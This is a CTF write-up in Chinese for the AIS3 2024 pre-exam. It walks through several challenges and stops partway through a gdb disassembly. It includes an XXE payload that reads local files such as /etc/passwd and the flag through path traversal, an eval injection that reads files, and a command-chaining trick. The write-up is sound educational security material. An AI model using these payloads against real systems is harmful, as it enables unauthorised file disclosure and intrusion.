[TOC]

![image](https://hackmd.io/_uploads/SyMw2-ONC.png)

# Welcome
flag 就在題目上
![image](https://hackmd.io/_uploads/SyqCB1W4A.png)

`The FLAG is AIS3{Welc0me_to_AIS3_PreExam_2o24!}`

# Evil Calculator
題目是一個用oython寫的計算機 去看他的source code後發現他在`app.py`的code中有使用到eval

```python=
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    expression = data['expression'].replace(" ","").replace("_","")
    try:
        result = eval(expression)
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run("0.0.0.0",5001)

```
eval就是一個很危險的東西 可以把你執行你輸入的不管是什麼東西 因此就可以想塞壞壞的東西了

那因為他是用post 所以就用burp抓一下然後來送payload

一開始想說可能要rce 所以一直想import os 但他有ban掉底線 這邊卡很久 因為滿腦子都是想要import os 所以一直瘋狂找繞過_的方法

![image](https://hackmd.io/_uploads/BypqKyWVA.png)

但主辦給提示說只要能撈到flag就好後就恍然大悟 根本不用import os 所以就直接去讀flag file 就解出來了 嘿嘿

![image](https://hackmd.io/_uploads/B14NY1bNA.png)
![image](https://hackmd.io/_uploads/rkWN-Yy4R.png)

`flag: AIS3{7RiANG13_5NAK3_I5_50_3Vi1}`

# Three Dimensional
一開始不知道pcapng file是幹嘛的 google後發現要用wireshark打開
原本想說是不是要連到某個網站拿flag或是說會藏flag在敘述裡 就全部都一直翻開找
直到後面發現follow的tcp stream後 加上覺得這三個顏色很奇怪 還有題目說三維 想說也有三 就開這三個看看

![image](https://hackmd.io/_uploads/H1wM9ox4R.png)

打開後發現裏頭有很多字 又看到有個G-code 就去google他 就大概知道是什麼

![image](https://hackmd.io/_uploads/BJ8ocJ-4A.png)
丟進[模擬器裡面](https://nraynaud.github.io/webgcode/) 後就得到一個flag的圖 打出來就對了

![image](https://hackmd.io/_uploads/HJXDcixVC.png)

`flag = AIS3{b4d1y_tun3d_PriN73r}`

![image](https://hackmd.io/_uploads/BJaccigNA.png)

# Emoji Console
題目是一個想要透過emoji組成可以讀取flag的指令

![image](https://hackmd.io/_uploads/SyRE8AlNA.png)

透過 cat * 可以得到所有emoji的相對應符號 同時也可以知道有個flag資料夾 flag應該就在裡面
![image](https://hackmd.io/_uploads/BklpS2yZV0.png)

我先自己創一個flag file在linux並自己根據表情符號嘗試去找出可用的emoji
這兩個是使用到的 `"😓": ";/" , "😐": ":|"`
並成功嘗試出指令

![image](https://hackmd.io/_uploads/BksFEybVR.png)

原理是 `cd flag ; 前面執行完了 再傳到後面的ls 這樣就成功把中間的/給省略掉了`
換成表情符號後嘗試

![image](https://hackmd.io/_uploads/rJ7eBy-VR.png)

這代表我成功讀到file了 而且從標頭可以發現他就是一個python file

那這時候我只要用這個🐍表情 也就是python去執行檔案 就可以得到flag了
` AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}`

![image](https://hackmd.io/_uploads/SkYsrJZN0.png)

# Quantum Nim Heist
這題也是網路上找到writeup 一開始打開source code後單純無聊好奇甚麼是grundy theorem 就上網google

![image](https://hackmd.io/_uploads/S1l63BXm4R.png)

結果就找到了之前的writeup 不知道是不是沒有擋好哈哈
https://gunjyo0817.github.io/2021/05/24/2021-AIS3-Pre-exam-write-up/

![image](https://hackmd.io/_uploads/ByBxIQQ40.png)

當時透過看他的解析得知說在`game.py` 檔案中 系統會給後手獲勝 但我們永遠是先後手 因此正常完的話我們是贏不了的
```python=
def generate_winning_game(self) -> None:
        '''generate a game such that the first player has a winning strategy'''
        self.stones = []
        xor_sum = 0

        piles = random.randint(6, 8)
        for i in range(piles):
            self.stones.append(count := random.randint(1, 31))
            xor_sum ^= count

        if xor_sum == 0:
            self.stones.append(random.randint(1, 31))

    def generate_losing_game(self) -> None:
        '''generate a game such that the second player has a winning strategy'''
        self.stones = []
        xor_sum = 0

        piles = random.randint(6, 8)
        for i in range(piles):
            self.stones.append(count := random.randint(1, 31))
            xor_sum ^= count

        if xor_sum != 0:
            self.stones.append(xor_sum)
```
因此我們要想辦法用第三種方法贏 透過`server.py` 的code可以看到他只有判斷0,1,2只要輸入其他數字就可以跳過回合 因此只要一直跳到最後一回合我們就贏了
```python=
if choice == '0':
        pile = int(input('which pile do you choose? '))
        count = int(input('how many stones do you remove? '))
        if not game.make_move(pile, count):
            print_error('that is not a valid move!')
            continue

    elif choice == '1':
        game_str = game.save()
        digest = hash.hexdigest(game_str.encode())
        print('you game has been saved! here is your saved game:')
        print(game_str + ':' + digest)
        return

    elif choice == '2':
        break
```

![image](https://hackmd.io/_uploads/S1miYPV4R.png)

` AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}`

# BabyRSA
題目打開後裏頭是一個RSA 原理是可以給對方用公鑰加密，但可以用自己的私鑰解密，不需要使用同一把鑰匙，原理是因為公鑰跟私鑰互為乘法反元素 詳情可以看李永樂老師 他有對RSA做簡單的介紹
https://www.youtube.com/watch?v=D_kMadCtKp8
那從題目的source code中可以看出他有使用RSA加密 但問題是出在第`31`行那邊 他並不是一次對所有明文加密 而是一個一個字的慢慢加密 因為不是一次整句加密 因此我們可以透過暴力破解 把`A-z` `a-z` `0-9` 全部都加密一遍然後慢慢地跟密文做比對 這邊是他有問題的地方
```python=
import random  # 導入random模組用於生成隨機數
from Crypto.Util.number import getPrime  # 從Crypto.Util.number模組中導入getPrime函數用於生成大質數
from secret import flag  # 從secret模組中導入flag，是需要加密的訊息

def gcd(a, b):  # 定義求最大公因數的函數
    while b:  # 當b不為0時
        a, b = b, a % b  # 使用輾轉相除法計算最大公因數
    return a  # 返回最大公因數

def generate_keypair(keysize):  # 定義生成密鑰對的函數，參數keysize為密鑰位數
    p = getPrime(keysize)  # 生成一個keysize位元的大質數p
    q = getPrime(keysize)  # 生成另一個keysize位元的大質數q
    n = p * q  # 計算n=p*q
    phi = (p-1) * (q-1)  # 計算totient函數值phi=(p-1)*(q-1)
    
    e = random.randrange(1, phi)  # 從1到phi-1中隨機選取一個數e
    g = gcd(e, phi)  # 計算e和phi的最大公因數g
    while g != 1:  # 如果g不等於1
        e = random.randrange(1, phi)  # 重新選取一個e
        g = gcd(e, phi)  # 計算新的e和phi的最大公因數
    d = pow(e, -1, phi)  # 計算e在模phi意義下的乘法反元素d
    return ((e, n), (d, n))  # 返回公鑰(e,n)和私鑰(d,n)

def encrypt(pk, plaintext):  # 定義加密函數，參數pk為公鑰，plaintext為明文
    key, n = pk  # 從公鑰中解包e和n
    cipher = [pow(ord(char), key, n) for char in plaintext]  # 對每個字元進行加密，存入cipher列表
    return cipher  # 返回加密後的密文列表

def decrypt(pk, ciphertext):  # 定義解密函數，參數pk為私鑰，ciphertext為密文
    key, n = pk  # 從私鑰中解包d和n
    plain = [chr(pow(char, key, n)) for char in ciphertext]  # 對每個密文字元進行解密，存入plain列表
    return ''.join(plain)  # 將plain列表連接成字串並返回

public, private = generate_keypair(512)  # 生成512位元的密鑰對
encrypted_msg = encrypt(public, 'a')  # 使用公鑰加密flag訊息
decrypted_msg = decrypt(private, encrypted_msg)  # 使用私鑰解密密文

print("Public Key:", public)  # 輸出公鑰
print("Encrypted:", encrypted_msg)  # 輸出加密後的密文
# print("Decrypted:", decrypted_msg)  # 這行被註解掉了，所以不會輸出解密後的明文
```
因此透過他的加密還有給的公鑰 我把`A-z` `a-z` `0-9`通通加密後拿去跟密文做比對
```python=
def encrypt(pk, plaintext):
    # 定義加密函數，參數pk為公鑰，plaintext為明文
    key, n = pk  # 從公鑰中解包e和n
    cipher = [pow(ord(char), key, n) for char in plaintext]  # 對每個字元進行加密，存入cipher列表
    return cipher  # 返回加密後的密文列表

# 定義公鑰
public_key = (
    64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733,
    115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649
)

# 構建明文字符串，包含A-Z、0-9和_
plaintext = ''.join(chr(i) for i in range(ord('a'), ord('z') + 1)) + ''.join(chr(i) for i in range(ord('A'), ord('Z') + 1))+ ''.join(chr(i) for i in range(ord('0'), ord('9') + 1)) + '_' +'{' + '}'

# 加密明文
cipher = encrypt(public_key, plaintext)

# 輸出結果
for plain_char, encrypted_char in zip(plaintext, cipher):
    print(f"{plain_char}: {encrypted_char}")

```
大概這麼多 我一個一個慢慢拿去做比對 好累嗚嗚
```=
a: 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088
b: 58828925452729811932976588739787965824652220690551333824296205824127538696058603108169405357158211350616510470513672533759883740745736322687898383422522330915631984810878357007178714597068087752425823728826608887027664209314455243118645386520598961325656254330576959063500755210398248129074822706590225088700
c: 98406178670518765642778274185959245049045048869937722162243826300969188747179423648341078408250844714262147300228861775588844724714534012478352066329172646611737101330856910483266476059110098050984180605179096051592653354005448342454698843608460134355130980208089671761450327608031027029766892771152993217023
d: 107340541989905757204370662416845552037146078905222935505789033122562501577684655501092154588544305605078885306044047839464564901594898750722560559313996616820973286189602827331851868376927628179028545097753144658073207307785378721899783095713473789007231709234504050418717400729711972350669632384570468096830
e: 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407
f: 12708160939460449797746334640370189741594393156198590130563300705594742285274155378452384449752817944962371880018673966875751948953034846634284138305820292201281595210265881917297911731564408181887226462606892964361033320116765426523499831287478314065882300932476595216136350756971622192468975464823677154324
g: 20222920908058605457111970272150612273139460769260447235596498596781683961010128426184024637706564546340327246191020540223566835757304493325371606037680402571948650998523099138137441154209281794538860160477031997660506452095283151142470607354579609545040759974018408429796935802188551530478970289514572978617
h: 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834
i: 9304987377904341606117201715658113065608581640101320211543462955469900806281721467187032121463132314663326494170970278379001634044806680348131292368949519512445580695938064509920503814133961673755470696223243390646274004621955993274826096679460577701554059204349111764901921932386091658007427259226167178177
j: 93764032982416419728110989523673483061741870521500609902409457090183794005571251472875010195009053086307654465823288489416250236539730165493416263808191303329853169309355747708320368855037255367158979073642503246009385151742892334126601360583312211249136384107185887459852614422719683517838350795469768446051
k: 48663498790221141072512959331353015609895324894813067128245934793822349426103438978160691539958762306196262276685056889144481438694192280954672131022741669935666413543110971106018639703779349096972959939821030023748615154121465960245629179067383675338467653392348641910658690176005795900056101420349303866813
l: 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148
m: 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871
n: 47953002091054578020381201294163023730809574731463958773592358719441988187452655748118051277286650853337305718192021972814357369747332979634917684999259838316305009239963225119133204824897098152777119627043881500966537112886938182847527574241215915396651397126350467492479189194162628876529519538265140143596
o: 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666
p: 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628
q: 84626667566916292909503245600703051735669046482812276107350772354386015435658699214300860297544542523789685805338003492448479092937710755256072746036754735400312966507725233400711278046241352298340024187691258033914673917559922415677051496864509360592462244899102831379787933874586912233965061836709201155585
r: 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716
s: 44262354102194743351911268289256770008339497245528544280709170541530088518398751380655719846628700171065092804544687718896291531970838072744874705570156704628202662829757806782131182294252555844059856971743311355891113953747318316062265029166813195656690004051327523203179399349334322871113218009692321746302
t: 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273
u: 20472445493228441292721090614657967895462252302228260568752427996680563809601852655319833688134475798137834395223726607334321531235376774219216055134601030184130917876549113091114144486261794932716233808194664233936783735663266743029212488020840969559603523111887524998658108503660068448898570323437482810017
v: 34661612116812273325510815885632987773878634626625747042958636362152583931260969561869719786378247664638641161656878412129162010084766438156247296031040184022246208883138926132649114007757242227131459285251878118564710945280013332131793855359773876332415772442620349609897435915019325055421286197078708187352
w: 10375003551421644749297435175286452188724359704818468758620073975479126617022001259087010343223679483145319058021113366640427927487146093564896950830992824603825664793128797255582672227168595259986006238616972682152232596891577680971613365965924679853480684644404917670808539147389507627782507009288649114560
x: 86665248049491278518956587295721205172778806332334359323764585145285529648424985425311302239695523457110756524306805040258077846349794158576413233026650471796374547487768331158492837547739419293977855465549256811087091190622794078572591354955736917887732851941530662750726866279933548202325061425727531513346
y: 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376
z: 6640225304964893991140471844863550208310731963667701630664344423558264988894932807632429704311138488841120017204952157973294514856930329640359277598748281541150921014427223003969669832551443894014968638296633441292926844378289901314452550472805145653933000291355960723492890040527221713812618649883323254468
A: 1665805297521640119669919457094144711238099413231800824465470812913880572669116305626521524153911904267238129531937952423409222225023467794927666422627082314285814656075569814644205638687105792760533211008966815918943917251927254624389871965679206262024216136163262412286874416732008465838711695063592124435
B: 82117335192885374780545631729654475529230492671768464597283113396574683298021804144386347024812236115234764817311260745784649928524347728334345134771312227188163981589701701848319601609197781835027228686460885309284616471451872680828173653509795343030610372184428206555155168507160363302311186318609105672521
C: 32463563387229396502994321924065961632284043136468238906625180045736135155253223928723914405824284085442712712337348213915399745045346853697650399659292339726614512642835897683094877670342609027803404027945312939777902664125228095034970967750466928999176126534504349068649205422848461193336320361026425455874
D: 47032389782110276649698667049553806083297564872041492566091309583573386316383152455212353716961503717754794269829279486379125433800031305538402610441529386187307219928643708346863297391574819123670962818022390397944664021641471682999706400149073576225800513191998195059383066330042718401138346261278278790318
E: 98886761316876029398305334083172167125619811338962626879180571553055903790184906506094199062042343163497921742775800177430842237152896087805096704117467325268684811264427484289308546897610492297513442621699498535953519678571553230552219737783486578437827402768400974118412180309789114874476347979909304079784
F: 65500011984921147039955352989636235828684360597006444510143160438991010204667506190791764442948157010587487901330922972441037672002538936345178096022627179792291759649206134766454823134934391756832988650980836853712247305506666846536121472382602405537193413711271281120291185534434795720997999397028164613740
G: 78131967268436612365840068910228372723097826131491622686844053985257746970002641869237390873215294666019866891738871528048435914114127369380634515126980611936835174965011818930765027529618727606328751376330367815491763066394474555539357715250645214345964173409171909793142802632012228919066408660239947058116
H: 47298207748555043794214416514699846618470685011209028521962896987752381812376376169566575975242642470883105757508408983557015134324045822232807690976521435462799103221685893780787112707063750285808663389276145782109170458777845510083881859353770171983858010090046368971607440018882336533116243032022193991265
I: 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263
J: 8253542590335209825357540576292669440749975397513890555289364167680374459965852066166315987031529549767779062816912982418296378452607133756746872483298009554259962484518943533623261718060454710336248730939205277728501013384280476282609628113757699990274900244351440296767609090232350096947286146428536783846
K: 50741584195538618095524828113011571418749042300570011316932236714450555752835589141017533783829459884994077371314508643262903066263742794024622770136292781996194429349704037846687617527713534928930641019820019795111960405329402016947757347191420797910839906974808399589188813304032435660220627948115344315269
L: 63634815088527144255090148113948593793648445499224983027630191877159813968754095341812467946868079279626991968747689424489021633678743106301884613005477044402324870044751927862596590687251830485165119422247449722579599610918927243419033509419967393677988976255284611384351411782311379786356079256916831362626
M: 102728587964394158258576318608185020952086922028217177425146990521729355345605756616118634745764509085679441632189672244634519401616789104533697561820602784577990242046357939840885029752870548756224227977745998810024049568737588887961941349006557054088892436732349774537943740980619590852481164713751080867507
N: 95457298055868694391877219138576497445115151186056513418820503159496876268497080831408725541436969299827723238663173668798694515208450035233192338795425824459299174728295661096981248839235055855929604893139239340445385259232905864515397406993189217322907168121716905101208450279521267289056195400878302077398
O: 100107044529880972174142930582274113212605553467282996600717187767461902168107279492845879361059603995860083182955854259031831000739915875961441333949234845871121761741803004053567678083417356923823732447611620870831353207927756349649230586860646383438066417464056168630349083130264772290714276422640373400616
P: 106002864970908911758561986949806810695746828527162987320336734146740851250202577712922089804659124508812221160502037212986458506751291282725535381620900524308820097483089842004075667315116840820699342249626196239329573355287279367397459751605085086074166484694106491280916865769072261288795100820211166628247
Q: 26448097879168597403570475176182860070645309502081790728044804349835551250957303054857578436103239536346859556848823590756558732397187136995037224623250112507535077179248980905173837151026590044843339175597897431295238257778402543427709902184151571581650356706759534900486923697223801262394354495501915319277
R: 111148295005522872381013243072719510599486336247725520230276570884405108867598273675982634474045372575368178766136647611399691042401286691216498223480831647237286358300204043119243649448501227917959997354015697216277818166387052576484802598400897382567685396408517215760299468626322473275582885285110843887793
S: 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182
T: 17525442355443739006798161136945234538289135293732159010469949341666347513585837371870704355037863634098163883611042121878362686860890223724238562583526550649340086051319234134907577624853632886715848962127706255769976443912657070070366400669740596805962173530384420842637554803041466900119050709458062167550
U: 67602482196856820166971428403758405739455475263382367621161896414339370625380754447863410276767241406699969322350803814348655243066328706656427717483623041308690996376549835317954286006923639192767262817817435759143930376297271756237829141630002480289781731985465743331200468015517012225741723423203374827341
V: 82872354087020858361510487460307873822854009093765054200314120276488244464367486945111490021096192150207350633852766207845261774194791379837714375434018479542987616249789577129730970280127879328052472417640086594032735052040226427299526164976886451223840756496838644887128967333070585083863753981102536155725
W: 100973406607792342552001761883205990604195436704981322009057677953376317030579406537480591693986645484718166370474635027640925196301438582632833514638999978243910138845358162762068071642182958057545766692754811516234231812026182429190403553972613701321820407635309445084992195091693891942759235514570894711742
X: 73191141612249119113394205962291498596843186941718509479481241069103357339878948368473021988344361999671167567556592640514022062495964222346418317815306729368192392456622518171512250525962736842030388245229837589747687061418276399078901535907497426383709201798108398978883528552941158089683261575422780566530
Y: 43967923748936484351732805873555964174712775706889811180819474140612599586161884530658035908721232399384729457223641995556425707839305124083600738135036620220298476686325110132022730675370888898063942501477522619906479683016701151321856269078215479158146009655223314957908787521092587379267241203076718674092
Z: 67922740049371860148171861967237405609189796996898809235093181054519285781409390867040008953375034435200502320352737952517031146813175289092865297196726153317115828714540763792223737568380862560371270344786812962454871280171968133618912067045657030017740664642561671763645673189289712054550794489490573613526
0: 10151551040546979802555822236669817831696195134524666830833045895556828185758824108087250036220861310453015517122746376500063820107695322832047369610537912312219289368685355005600234966987912000565917918862357241152096809505149349142716561518929868324001671130908381386201800326547907485472727777734544912039
1: 3085377115073481737487767519304315808353144937670566256348398664810936964565637157736537945459712875615504238408907602974507381828272609303797146395233485026377776965939508974096385939172942695211339651597248692728550782246178293579153110379844451779466255357619524290412118137515779354431956948078394927940
2: 74498310069768478533749364220338064793045946813162152890798282224092035502110737924661661072791187498196279521446439833357943846106320057860392454638859501192458784994850871161018720810294209509084659107824483179564599680316934174488728317060891410431861731741332549674280367312531277655092775433199620583308
3: 38285633551521777138710771085033430239170710707266775875598456653892976969437761922968925746226073683095654278272586779539831402373205526909772633370025848937463033570747721110932401276480992827694564074802181306738438015295515798739406061377284368603543443076476369810597345436481251791260803352288977423573
4: 107299436659121219633681874816678062815503539339218245125411438746336781504734640545970445445507160285792021906843372788508063944584035865929809523540159867251645029215423230785210924599076157527917501626607118619949659023900053335261325881200331653776207709407433817699342550340273397624325482734999937839958
5: 80544515807516347666782350236252356939860466206876664708746318427953932622814486784723970008940550428731956482134355176400990006394255515065546364861427408793914692928255366630172720930856309169811824536971702730054156529868643863933678169963844044530930613960188274822886619530916055389937098431871788435376
6: 68841242667403236772313107772774990410064428709470986710958087480981125426343903869080789695175358349101286365818129788556136157061772848162620820300957539707081114211737323621505209360528777194891525059051347990476467032201412959054259496168850119539192392724157128864621798107942773994724141102370949039512
7: 44251483621838966637028905021030037306882731747248146012711836892987832091968708880508559926985759195948209552798710664595977478965137017434445952286562131396837277786463023806499804163200952188616348895150053381221378548867413225356144864470486975226711493537618467162916197675598340330370430774678272067883
8: 115159276838581685702939786621474521549917204900972355806218208696081300347604678394951331786697960449462116511894516203435960304798555694623302187751550326809195583384166486532934903069802888491329536066683652615304850649266156393163650784203386522164362372705041276750336497465656041309635102286150727149554
9: 72316513005439367475951694644175925492422010712583185343193240244117890836903881475566973237697088623783516425021527860176987712462529182109636173186863676196102385925561252042238795171886989221639359275220298570593252219159194262685376565498964528263375492931661831691773554317235033017642149382262171720187
_: 15712957353925589936077754216010243607185906882705709002962782529893888445549785948197890526263440623661470686235960731608295140084040734840199786407600132789083990435729548753575019810007524747889445684017044941171485123373837174700494230006437438902665596104487801590352210831981816218646220191229863715239
{: 90968383857681404242927909477464252602387471219945950453665598772039832078487309149670692874283215437984574695320981806360379096212936326954111131608499584545969103096096842380877613033764006459107764277330135816044808210474597200172673683909558627722941503504083244424751773797618360290613996970960151563724
}: 52745488365658861485519010696623986434656675831322149607647058389953842185045922621964255927212518970223978973817292179059730382537814695353016058702226289640834171560498112170760826276332972100423555174686162215383841925656596984188536350046664199627214379076416024495451320834231863438007383528385204646269
```
最後一一比對完後就得到flag了

![image](https://hackmd.io/_uploads/B1IkzuNVR.png)

`flag : AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}`

![image](https://hackmd.io/_uploads/r15YYQ-E0.png)


# Ebook Parser
原本打開這題不知道可以如何下手 只有從作者給的requirements.txt知道他有使用了甚麼套件 其中有lxml一種來解析xml的套件 因此猜測可能XXE(?

![image](https://hackmd.io/_uploads/HJFb2f7VA.png)

之後一連串google後在github上發現了一個熱騰騰的issue 不知道是不是有心人所為XD
https://github.com/dnkorpushov/ebookmeta/issues/16
我建了一個跟他一樣的file並命名為payload.fb2後就有成功的拿到/etc/passwd的資料

![image](https://hackmd.io/_uploads/HJQ6nzQNR.png)

那這樣代表說這個issue的payload是可以用在這題上的XD 那我們這邊想要拿到的是flag 因此把etc/passwd部分替換掉 透過path traversal來讀到根目錄的flag

```xml=
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///../../flag" >]>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
<description>
    <title-info>
        <genre>antique</genre>
        <author><first-name></first-name><last-name>&xxe;</last-name></author>
        <book-title>&xxe;</book-title>
        <lang>&xxe;</lang>
    </title-info>
    <document-info>
        <author><first-name></first-name><last-name>Unknown</last-name></author>
        <program-used>calibre 6.13.0</program-used>
        <date>26.5.2024</date>
        <id>eb5cbf82-22b5-4331-8009-551a95342ea0</id>
        <version>1.0</version>
    </document-info>
    <publish-info>
    </publish-info>
</description>
<body>
<section>
<p>&lt;root&gt;</p>
<p>12345</p>
<p>&lt;/root&gt;</p>
</section>
</body>

</FictionBook>
```
上傳後就成功得到flag了 耶! 再右鍵檢查把它複製下來貼上

![image](https://hackmd.io/_uploads/BkMocsZEA.png)

![image](https://hackmd.io/_uploads/ByvjtobEC.png)

`AIS3{LP#1742885: lxml no longer expands external entities (XXE) by default}`
這次雖然是剛好有人傳了issue所以解開 但我會去了解它的原因跟做法的嗚嗚

# The Long Print
一開始我想說直接丟到 https://hexed.it/ 想說會不會flag就在裡面 有看到一個寫fake的flag 雖然知道應該是假的但還是拿去試了一下後果然是假的QQ 

![image](https://hackmd.io/_uploads/B18VHO440.png)

之後就開啟ida 案F5看一下他的程式

![image](https://hackmd.io/_uploads/SJKSHu4VC.png)

用GPT 幫他加個註解 可以得知他在做一個flag的運算 把secret跟key做XOR來生成flag 問題出在中間有個sleep 因此會讓程式hang在那邊很久 所以大致上的解題思路就是要跳過sleep的指令然後讓他執行12次flag就會跳出來了
```cpp=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  // 宣告變數
  unsigned int v4; // 暫存變數，用於存儲解密後的字符
  int i; // 用於外層for循環的計數變數
  int j; // 用於內層for循環的計數變數

  // 輸出提示訊息
  puts("Hope you have enough time to receive my flag:");

  // 外層for循環，處理24個4字節組，每次增量為2（處理12次循環）
  for ( i = 0; i <= 23; i += 2 )
  {
    // 將secret陣列中的4個字節轉換為一個整數並與key陣列中的一個元素進行異或運算
    v4 = *(_DWORD *)&secret[4 * i] ^ key[*(unsigned int *)&secret[4 * i + 4]];

    // 內層for循環，處理v4中的每個字節（共4個字節）
    for ( j = 0; j <= 3; ++j )
    {
      // 睡眠0x3674（13940）毫秒，模擬耗時操作
      sleep(0x3674u);

      // 輸出v4的最低位字節
      printf("%c", v4);

      // 右移v4，準備輸出下一個字節
      v4 >>= 8;

      // 刷新標準輸出緩衝區
      fflush(_bss_start);
    }
  }

  // 輸出提示訊息，告知用戶旗標應該已經輸出
  puts("\rOops! Where is the flag? I am sure that the flag is already printed!");

  // 返回0，表示程序成功執行
  return 0;
}
```
那就打開gdb來操作一下(因為不會用ida 只會ida F5 XD)
首先`info function` 可以看看他有哪些function

![image](https://hackmd.io/_uploads/HJb7Y_NEC.png)

再來反編譯 main function看看裡面 這是它裡面所有的
```asm=
0x00000000000011a9 <+0>:     endbr64
   0x00000000000011ad <+4>:     push   rbp
   0x00000000000011ae <+5>:     mov    rbp,rsp
   0x00000000000011b1 <+8>:     sub    rsp,0x10
   0x00000000000011b5 <+12>:    mov    DWORD PTR [rbp-0xc],0x0
   0x00000000000011bc <+19>:    lea    rdi,[rip+0xeed]        # 0x20b0
   0x00000000000011c3 <+26>:    call   0x1080 <puts@plt>
   0x00000000000011c8 <+31>:    mov    DWORD PTR [rbp-0x8],0x0
   0x00000000000011cf <+38>:    jmp    0x1271 <main+200>
   0x00000000000011d4 <+43>:    mov    eax,DWORD PTR [rbp-0x8]
   0x00000000000011d7 <+46>:    cdqe
   0x00000000000011d9 <+48>:    lea    rdx,[rax*4+0x0]
   0x00000000000011e1 <+56>:    lea    rax,[rip+0xe38]        # 0x2020 <secret>                                                             
   0x00000000000011e8 <+63>:    add    rax,rdx
   0x00000000000011eb <+66>:    mov    edx,DWORD PTR [rax]
   0x00000000000011ed <+68>:    mov    eax,DWORD PTR [rbp-0x8]
   0x00000000000011f0 <+71>:    add    eax,0x1
   0x00000000000011f3 <+74>:    cdqe
   0x00000000000011f5 <+76>:    lea    rcx,[rax*4+0x0]
   0x00000000000011fd <+84>:    lea    rax,[rip+0xe1c]        # 0x2020 <secret>                                                             
   0x0000000000001204 <+91>:    add    rax,rcx
   0x0000000000001207 <+94>:    mov    eax,DWORD PTR [rax]
   0x0000000000001209 <+96>:    mov    eax,eax
   0x000000000000120b <+98>:    lea    rcx,[rax*4+0x0]
   0x0000000000001213 <+106>:   lea    rax,[rip+0xe66]        # 0x2080 <key>                                                                
   0x000000000000121a <+113>:   mov    eax,DWORD PTR [rcx+rax*1]
   0x000000000000121d <+116>:   xor    eax,edx
   0x000000000000121f <+118>:   mov    DWORD PTR [rbp-0xc],eax
   0x0000000000001222 <+121>:   mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001229 <+128>:   jmp    0x1267 <main+190>
   0x000000000000122b <+130>:   mov    edi,0x3674
   0x0000000000001230 <+135>:   call   0x10b0 <sleep@plt>
   0x0000000000001235 <+140>:   mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000001238 <+143>:   mov    esi,eax
   0x000000000000123a <+145>:   lea    rdi,[rip+0xe9d]        # 0x20de
   0x0000000000001241 <+152>:   mov    eax,0x0
   0x0000000000001246 <+157>:   call   0x1090 <printf@plt>
   0x000000000000124b <+162>:   mov    eax,DWORD PTR [rbp-0xc]
   0x000000000000124e <+165>:   shr    eax,0x8
   0x0000000000001251 <+168>:   mov    DWORD PTR [rbp-0xc],eax
   0x0000000000001254 <+171>:   mov    rax,QWORD PTR [rip+0x2db5]        # 0x4010 <stdout@@GLIBC_2.2.5>                                     
   0x000000000000125b <+178>:   mov    rdi,rax
   0x000000000000125e <+181>:   call   0x10a0 <fflush@plt>
   0x0000000000001263 <+186>:   add    DWORD PTR [rbp-0x4],0x1
   0x0000000000001267 <+190>:   cmp    DWORD PTR [rbp-0x4],0x3
   0x000000000000126b <+194>:   jle    0x122b <main+130>
   0x000000000000126d <+196>:   add    DWORD PTR [rbp-0x8],0x2
   0x0000000000001271 <+200>:   cmp    DWORD PTR [rbp-0x8],0x17
